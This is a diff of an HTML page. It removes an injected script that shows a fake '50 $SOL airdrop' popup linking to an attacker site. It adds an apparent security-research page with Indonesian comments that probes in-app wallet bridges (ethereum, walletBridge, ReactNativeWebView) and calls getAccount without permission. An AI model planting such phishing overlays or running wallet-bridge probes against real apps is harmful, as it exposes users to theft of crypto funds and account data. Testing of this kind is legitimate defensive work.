@@ -1,14 +1,38 @@
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  let modal = document.createElement('div');
-  modal.innerHTML = `
-  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;">
-    <div style="background:white;padding:20px;border-radius:10px;text-align:center;font-family:sans-serif;max-width:300px;">
-      <h3>🎉 Claim Your 50 $SOL Airdrop</h3>
-      <p>Click the button below to claim now.</p>
-      <a href='http://evil-attacker.site/claim' target='_blank' style='padding:10px 20px;background:#4caf50;color:white;text-decoration:none;border-radius:5px;display:inline-block;margin-top:10px;'>Claim Now</a>
-    </div>
-  </div>`;
-  document.body.appendChild(modal);
-});
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>Security Research: Bridge Validation Test</h3>
+    <button onclick="testBridge()">Tes Koneksi Bridge</button>
+    <pre id="log"></pre>
+
+    <script>
+        function log(msg) {
+            document.getElementById('log').innerHTML += msg + "\n";
+        }
+
+        function testBridge() {
+            // Skenario: Mencoba mengakses fungsi native yang terekspos
+            // Nama bridge berbeda-beda tiap wallet (misal: ethereum, walletBridge, InjectedProvider)
+            
+            const potentialBridges = ['ethereum', 'walletBridge', 'ReactNativeWebView', '1inchBridge'];
+            
+            potentialBridges.forEach(bridge => {
+                if (window[bridge]) {
+                    log("DITEMUKAN: " + bridge + " bridge tersedia!");
+                    
+                    // Mencoba memanggil fungsi tanpa izin (Exploitation Attempt)
+                    try {
+                        console.log("Mencoba memanggil fungsi getAccount...");
+                        const data = window[bridge].getAccount ? window[bridge].getAccount() : "No getAccount";
+                        log("Hasil: " + JSON.stringify(data));
+                    } catch (e) {
+                        log("Gagal memanggil fungsi (terproteksi): " + e.message);
+                    }
+                } else {
+                    log("Bridge " + bridge + " tidak ditemukan.");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
